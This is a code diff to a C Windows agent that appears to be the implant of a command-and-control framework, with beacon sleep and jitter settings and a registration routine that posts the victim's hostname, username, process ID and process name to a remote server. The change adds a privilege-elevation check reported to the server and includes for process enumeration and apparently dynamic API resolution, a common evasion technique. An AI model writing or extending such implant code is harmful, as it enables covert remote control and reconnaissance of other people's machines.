@@ -4,9 +4,11 @@
 #include "b64.h"
 #include <windows.h>
 #include <winhttp.h>
+#include <tlhelp32.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
+#include "api_resolve.h"
 
 AgentState g_agent = {0};
 
@@ -200,6 +202,15 @@ static const char* next_obj(const char *p, const char **end) {
 
 // ── Agent protocol ────────────────────────────────────────────────────────────
 
+static int is_elevated(void) {
+    HANDLE token;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;
+    DWORD elev = 0, sz = sizeof(DWORD);
+    BOOL ok = GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &sz);
+    CloseHandle(token);
+    return ok && elev;
+}
+
 int agent_register(void) {
     char exe_name[MAX_PATH] = "agent.exe";
     GetModuleFileNameA(NULL, exe_name, sizeof(exe_name));
@@ -214,9 +225,10 @@ int agent_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\"}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s}",
         hostname, username, (unsigned long)GetCurrentProcessId(),
-        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name);
+        AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
+        is_elevated() ? "true" : "false");
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register",
